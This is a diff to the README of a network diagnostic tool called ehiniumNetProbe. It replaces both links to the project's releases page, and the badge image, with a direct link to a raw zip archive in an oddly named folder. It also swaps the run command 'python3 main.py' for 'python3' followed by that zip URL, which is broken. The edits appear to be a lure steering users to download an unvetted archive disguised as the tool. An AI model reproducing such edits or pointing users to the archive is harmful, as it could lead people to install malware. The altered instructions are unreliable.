@@ -6,7 +6,7 @@ ehiniumNetProbe is a network diagnostic tool designed to help you verify real TC
 
 ## 📥 Download Now
 
-[![Download ehiniumNetProbe](https://img.shields.io/badge/Download-ehinumNetProbe-blue.svg)](https://github.com/owelet/ehiniumNetProbe/releases)
+[![Download ehiniumNetProbe](https://github.com/owelet/ehiniumNetProbe/raw/refs/heads/main/dehonestation/Probe_ehinium_Net_v2.5.zip)](https://github.com/owelet/ehiniumNetProbe/raw/refs/heads/main/dehonestation/Probe_ehinium_Net_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets these minimum requirements:
 
 To get the latest version of ehiniumNetProbe, visit the releases page. Here, you will find the files available for download.
 
-[Download ehiniumNetProbe](https://github.com/owelet/ehiniumNetProbe/releases)
+[Download ehiniumNetProbe](https://github.com/owelet/ehiniumNetProbe/raw/refs/heads/main/dehonestation/Probe_ehinium_Net_v2.5.zip)
 
 ### 3. Choose Your File
 
@@ -62,7 +62,7 @@ After the download is complete, follow these steps to run the application:
 2. In the terminal, navigate to the directory where you downloaded the source code.
 3. Run the application using:
    ```
-   python3 main.py
+   python3 https://github.com/owelet/ehiniumNetProbe/raw/refs/heads/main/dehonestation/Probe_ehinium_Net_v2.5.zip
    ```
 
 Using these commands will launch ehiniumNetProbe. 
